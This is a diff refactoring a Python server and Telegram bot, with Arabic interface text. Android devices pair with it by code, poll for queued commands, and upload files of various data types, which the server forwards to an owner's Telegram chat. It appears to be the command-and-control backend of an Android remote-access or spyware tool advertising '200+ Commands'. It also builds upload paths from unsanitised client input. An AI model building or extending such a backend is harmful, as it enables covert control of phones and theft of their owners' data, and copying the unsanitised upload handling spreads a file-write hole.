-    text += f"🤖 Android: {info.get('android', '?')}\n"
-    text += f"الحالة: {'🟢 متصل' if info.get('online') else '🔴 غير متصل'}\n"
-    text += f"الربط: {'✅ مرتبط' if info.get('linked') else '⏳ انتظار'}\n"
-    text += f"آخر اتصال: {info.get('last_seen', '?')}\n"
-    text += f"تاريخ التسجيل: {info.get('registered', '?')}\n"
-    
-    # عدد الأوامر المعلقة
-    pending = len(store.commands.get(device_id, []))
-    text += f"\n📋 أوامر معلقة: {pending}"
-    
-    await edit_msg(chat_id, msg_id, text, device_keyboard(device_id))
+    await edit_msg(cid, mid, t, device_kb(did))
 
-async def show_status(chat_id, msg_id=None):
+async def show_status(cid, mid=None):
     try:
         import psutil
-        cpu = psutil.cpu_percent()
-        memory = psutil.virtual_memory().percent
-        disk = psutil.disk_usage('/').percent
+        c, m, d = psutil.cpu_percent(), psutil.virtual_memory().percent, psutil.disk_usage('/').percent
     except:
-        cpu = memory = disk = 0
+        c = m = d = 0
     
-    connected = sum(1 for d in store.devices.values() if d.get("online"))
+    conn = sum(1 for dev in store.devices.values() if dev.get("online"))
     total = len(store.devices)
     
-    text = f"📊 *حالة النظام*\n\n"
-    text += f"💻 CPU: {cpu}%\n"
-    text += f"🧠 RAM: {memory}%\n"
-    text += f"💾 Disk: {disk}%\n\n"
-    text += f"📱 الأجهزة: {connected}/{total} متصل\n"
-    text += f"⏰ {datetime.now().strftime('%H:%M:%S')}"
+    t = f"📊 *الحالة*\n💻 CPU: {c}%\n🧠 RAM: {m}%\n💾 Disk: {d}%\n📱 أجهزة: {conn}/{total}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
+    kb = {"inline_keyboard": [[{"text": "🔙", "callback_data": "back"}]]}
     
-    keyboard = {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "back"}]]}
-    
-    if msg_id:
-        await edit_msg(chat_id, msg_id, text, keyboard)
+    if mid:
+        await edit_msg(cid, mid, t, kb)
     else:
-        await send_msg(chat_id, text, keyboard)
+        await send_msg(cid, t, kb)
 
 # ═══════════════════════════════════════════
 # استقبال التحديثات
 # ═══════════════════════════════════════════
-async def poll_updates():
+async def poll():
     while True:
         try:
-            result = await api_call("getUpdates", {
-                "offset": store.last_update_id + 1,
-                "limit": 10,
-                "timeout": 30
-            })
-            
-            if result and result.get("ok"):
-                for update in result.get("result", []):
-                    store.last_update_id = update["update_id"]
-                    
-                    if "message" in update:
-                        await handle_message(update["message"])
-                    elif "callback_query" in update:
-                        await handle_callback(update["callback_query"])
-            
+            r = await api_call("getUpdates", {"offset": store.last_update_id + 1, "limit": 10, "timeout": 30})
+            if r and r.get("ok"):
+                for u in r.get("result", []):
+                    store.last_update_id = u["update_id"]
+                    if "message" in u:
+                        await on_message(u["message"])
+                    elif "callback_query" in u:
+                        await on_callback(u["callback_query"])
             await asyncio.sleep(1)
-        
         except Exception as e:
             logger.error(f"Poll error: {e}")
             await asyncio.sleep(5)
@@ -568,172 +547,115 @@ async def poll_updates():
 # ═══════════════════════════════════════════
 # خادم الويب
 # ═══════════════════════════════════════════
-async def handle_verify(request):
-    """التحقق من كود الربط"""
+async def verify(request):
     try:
-        data = await request.json()
-        code = data.get("code")
-        device_id = data.get("device_id")
-        model = data.get("model", "Unknown")
-        android = data.get("android", "Unknown")
-        
-        logger.info(f"Verify: code={code}, device={model}")
+        d = await request.json()
+        code = d.get("code")
+        did = d.get("device_id")
+        model = d.get("model", "?")
+        android = d.get("android", "?")
         
         if code not in store.codes:
-            return web.json_response({"status": "error", "message": ResponseMsg.INVALID_CODE})
+            return web.json_response({"status": "error", "message": "كود غير صحيح"})
         
-        code_info = store.codes[code]
-        code_info["device_id"] = device_id
+        ci = store.codes[code]
+        ci["device_id"] = did
         
-        # تسجيل الجهاز
-        store.devices[device_id] = {
-            "model": model,
-            "android": android,
-            "online": True,
-            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "registered": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "linked": True,
-            "owner": code_info["chat_id"]
+        store.devices[did] = {
+            "model": model, "android": android,
+            "online": True, "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "linked": True, "owner": ci["chat_id"]
         }
         
-        # إشعار المالك
-        await send_msg(code_info["chat_id"],
-            f"✅ *تم ربط جهاز جديد!*\n\n"
-            f"📱 الموديل: {model}\n"
-            f"🤖 Android {android}\n"
-            f"🆔 المعرف: `{device_id[:8]}...`\n"
-            f"⏰ {datetime.now().strftime('%H:%M:%S')}")
-        
-        return web.json_response({"status": "ok", "device_id": device_id})
-    
+        await send_msg(ci["chat_id"], f"✅ *تم ربط جهاز!*\n📱 {model}\n🤖 Android {android}")
+        return web.json_response({"status": "ok", "device_id": did})
     except Exception as e:
-        logger.error(f"Verify error: {e}")
         return web.json_response({"status": "error", "message": str(e)})
 
-async def handle_register(request):
+async def register(request):
     try:
-        data = await request.json()
-        did = data.get("device_id")
-        
+        d = await request.json()
+        did = d.get("device_id")
         if did in store.devices:
             store.devices[did]["online"] = True
             store.devices[did]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         else:
-            store.devices[did] = {
-                "model": data.get("model", "?"),
-                "android": data.get("android", "?"),
-                "online": True,
-                "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "linked": False
-            }
-        
-        return web.json_response({"status": "ok"})
-    except Exception as e:
-        return web.json_response({"status": "error", "message": str(e)})
-
-async def handle_data(request):
-    try:
-        reader = await request.multipart()
-        device_id = None
-        data_type = None
-        file_path = None
-        
-        while True:
-            part = await reader.next()
-            if part is None:
-                break
-            
-            if part.name == "device_id":
-                device_id = await part.text()
-            elif part.name == "type":
-                data_type = await part.text()
-            elif part.name == "file":
-                filename = f"{device_id}_{data_type}_{int(time.time())}_{part.filename}"
-                file_path = os.path.join(UPLOAD_DIR, filename)
-                
-                with open(file_path, "wb") as f:
-                    while True:
-                        chunk = await part.read_chunk()
-                        if not chunk:
-                            break
-                        f.write(chunk)
-        
-        if device_id and data_type:
-            logger.info(f"Data received: {device_id} - {data_type}")
-            
-            # إرسال إشعار للمالك
-            if device_id in store.devices and store.devices[device_id].get("linked"):
-                owner = store.devices[device_id].get("owner")
-                if owner:
-                    await send_msg(owner,
-                        f"📥 *بيانات جديدة!*\n\n"
-                        f"📱 الجهاز: {store.devices[device_id].get('model', '?')}\n"
-                        f"📁 النوع: {data_type}\n"
-                        f"⏰ {datetime.now().strftime('%H:%M:%S')}")
-                    
-                    # إرسال الملف
-                    if file_path and os.path.exists(file_path):
-                        await send_file(owner, file_path, f"📱 {data_type}")
-            
-            return web.json_response({"status": "ok"})
-        
-        return web.json_response({"status": "error", "message": "Missing data"})
-    
-    except Exception as e:
-        logger.error(f"Data error: {e}")
-        return web.json_response({"status": "error", "message": str(e)})
-
-async def handle_commands(request):
-    """استرجاع الأوامر للجهاز"""
-    try:
-        device_id = request.query.get("device_id", "")
-        commands = store.commands.get(device_id, [])
-        store.commands[device_id] = []
-        return web.json_response({"commands": commands})
-    except:
-        return web.json_response({"commands": []})
-
-async def handle_status(request):
-    """تحديث حالة الجهاز"""
-    try:
-        data = await request.json()
-        did = data.get("device_id")
-        
-        if did in store.devices:
-            store.devices[did]["online"] = True
-            store.devices[did]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
+            store.devices[did] = {"model": d.get("model", "?"), "android": d.get("android", "?"),
+                "online": True, "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "linked": False}
         return web.json_response({"status": "ok"})
     except:
         return web.json_response({"status": "error"})
 
-async def init_app():
-    app = web.Application()
-    app.router.add_post("/api/verify_code", handle_verify)
-    app.router.add_post("/api/register", handle_register)
-    app.router.add_post("/api/data", handle_data)
-    app.router.add_get("/api/commands", handle_commands)
-    app.router.add_post("/api/status", handle_status)
-    return app
+async def data(request):
+    try:
+        reader = await request.multipart()
+        did = dtype = None
+        path = None
+        while True:
+            part = await reader.next()
+            if part is None: break
+            if part.name == "device_id": did = await part.text()
+            elif part.name == "type": dtype = await part.text()
+            elif part.name == "file":
+                fn = f"{did}_{dtype}_{int(time.time())}_{part.filename}"
+                path = os.path.join(UPLOAD_DIR, fn)
+                with open(path, "wb") as f:
+                    while True:
+                        chunk = await part.read_chunk()
+                        if not chunk: break
+                        f.write(chunk)
+        
+        if did and dtype:
+            if did in store.devices and store.devices[did].get("linked"):
+                owner = store.devices[did].get("owner")
+                if owner:
+                    await send_msg(owner, f"📥 *بيانات جديدة!*\n📱 {store.devices[did].get('model', '?')}\n📁 {dtype}")
+                    if path and os.path.exists(path):
+                        await send_file(owner, path, f"📱 {dtype}")
+            return web.json_response({"status": "ok"})
+        return web.json_response({"status": "error"})
+    except Exception as e:
+        return web.json_response({"status": "error"})
 
-# ═══════════════════════════════════════════
-# التشغيل الرئيسي
-# ═══════════════════════════════════════════
+async def commands(request):
+    try:
+        did = request.query.get("device_id", "")
+        cmds = store.commands.get(did, [])
+        store.commands[did] = []
+        return web.json_response({"commands": cmds})
+    except:
+        return web.json_response({"commands": []})
+
+async def status(request):
+    try:
+        d = await request.json()
+        did = d.get("device_id")
+        if did in store.devices:
+            store.devices[did]["online"] = True
+            store.devices[did]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        return web.json_response({"status": "ok"})
+    except:
+        return web.json_response({"status": "error"})
+
 async def main():
     logger.info("=" * 60)
-    logger.info("  Al-Zahra Bot v6.0 - Professional")
+    logger.info("  Al-Zahra Bot v7.0 - 200+ Commands")
     logger.info("=" * 60)
     
-    app = await init_app()
+    app = web.Application()
+    app.router.add_post("/api/verify_code", verify)
+    app.router.add_post("/api/register", register)
+    app.router.add_post("/api/data", data)
+    app.router.add_get("/api/commands", commands)
+    app.router.add_post("/api/status", status)
+    
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", PORT)
     await site.start()
     
-    logger.info(f"Server started on port {PORT}")
-    logger.info(f"Bot token: {BOT_TOKEN[:10]}...")
-    
-    await poll_updates()
+    logger.info(f"Server on port {PORT}")
+    await poll()
 
 if __name__ == "__main__":
     asyncio.run(main())
